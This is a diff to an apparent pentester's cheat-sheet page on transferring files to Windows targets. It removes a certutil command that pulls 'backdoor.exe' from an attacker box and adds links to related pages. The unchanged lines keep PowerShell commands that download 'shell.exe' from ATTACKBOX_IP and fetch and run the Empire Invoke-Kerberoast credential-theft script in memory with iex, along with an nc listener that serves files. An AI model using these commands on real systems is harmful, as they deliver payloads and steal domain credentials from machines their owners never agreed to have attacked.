@@ -36,9 +36,6 @@ $PSVersionTable
 ```powershell
 (New-Object system.Net.WebClient).Downloadfile('http://ATTACKBOX_IP/shell.exe')
 
-certutil -urlcache -split -f http://$ATTACKBOX_IP/backdoor.exe
-
-
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
 
 Invoke-WebRequest -Uri http://$ATTACKBOX_IP -OutFile file.exe
@@ -54,7 +51,7 @@ while(1) { cat index.html | nc -w1 -l -p 8080 }
 # HARDCORE GUI way:
 # Add ip to trusted sites and download
 ```
-[Add to trusted sites with powershell](https://stackoverflow.com/questions/51720030/ie-browser-powershell-script-to-add-site-to-trusted-sites-list-disable-protec)
+[Add to trusted sites with powershell](https://stackoverflow.com/questions/51720030/ie-browser-powershell-script-to-add-site-to-trusted-sites-list-disable-protec) there are always [[Windows-File-Transfers]] and [[Windows-Living-Off-The-Land]]
 
 ## General
 ```powershell
